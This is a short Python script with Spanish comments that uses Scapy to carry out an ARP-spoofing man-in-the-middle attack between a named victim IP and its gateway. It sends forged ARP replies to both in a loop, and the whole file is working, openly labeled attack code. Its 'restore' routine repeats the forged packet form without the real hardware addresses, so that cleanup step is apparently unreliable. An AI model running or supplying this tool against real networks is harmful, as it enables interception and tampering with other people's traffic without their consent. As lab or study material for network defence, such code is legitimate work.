#!/usr/bin/env python3

# Cambiamos 'sendp' por 'send' en la importacion
from scapy.all import ARP, Ether, send, get_if_hwaddr
import time
import sys

# --- CONFIGURACION DE TU RED ---
IP_VICTIMA = "10.15.29.5"   # Tu Windows
IP_ROUTER = "10.15.29.1"    # Tu Gateway
INTERFAZ = "eth0"
# -------------------------------

def spoof(target_ip, spoof_ip):
    """ Envia el paquete ARP falso """
    # Usamos send() porque estamos enviando un paquete ARP (Capa 3 de Scapy)
    paquete = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(paquete, verbose=False)

def restaurar(target_ip, source_ip):
    """ Limpia las tablas ARP al finalizar """
    paquete = ARP(op=2, pdst=target_ip, psrc=source_ip)
    send(paquete, count=5, verbose=False)

def iniciar_mitm():
    print("[+] Configuracion mitm " + IP_VICTIMA + " <------> " + IP_ROUTER)
    print("[+] Presiona Ctrl+C para detener el ataque.")

    contador = 0
    try:
        while True:
            # Engañamos a la Victima: "Yo soy el Router"
            spoof(IP_VICTIMA, IP_ROUTER)
            # Engañamos al Router: "Yo soy la Victima"
            spoof(IP_ROUTER, IP_VICTIMA)
            
            contador += 2
            print("\r[+] Paquetes ARP enviados: " + str(contador), end="")
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n\n[-] DETENIENDO EL PROGRAMA....")
        print("[*] RESTAURANDO TABLAS ARP ORIGINALES....")
        restaurar(IP_VICTIMA, IP_ROUTER)
        restaurar(IP_ROUTER, IP_VICTIMA)
        print("[*] RED RESTAURADA. SALIENDO")

if __name__ == "__main__":
    iniciar_mitm()